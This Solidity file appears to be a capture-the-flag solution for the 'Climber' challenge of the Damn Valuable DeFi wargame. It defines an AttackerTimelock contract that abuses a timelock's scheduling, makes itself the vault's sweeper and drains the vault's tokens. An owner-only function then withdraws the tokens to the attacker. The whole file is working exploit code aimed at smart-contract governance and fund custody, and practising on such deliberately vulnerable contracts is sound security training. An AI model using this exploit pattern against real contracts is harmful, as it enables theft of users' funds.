// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./ClimberTimelock.sol";
import "./AttackerVault.sol";

contract AttackerTimelock {
    address vault;
    address payable timelock;
    address token;
    address owner;
    bytes[] private scheduleData;
    address[] private to;

    constructor(
        address _vault,
        address payable _timelock,
        address _token,
        address _owner
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory _data)
        external
    {
        to = _to;
        scheduleData = _data;
    }

    function attack() external {
        uint256[] memory emptyData = new uint256[](to.length);
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        AttackerVault(vault)._setSweeper(address(this));
        AttackerVault(vault).sweepFunds(token);
    }

    function withdraw() external {
        require(msg.sender == owner, "only owner");
        DamnValuableToken(token).transfer(
            owner,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }
}
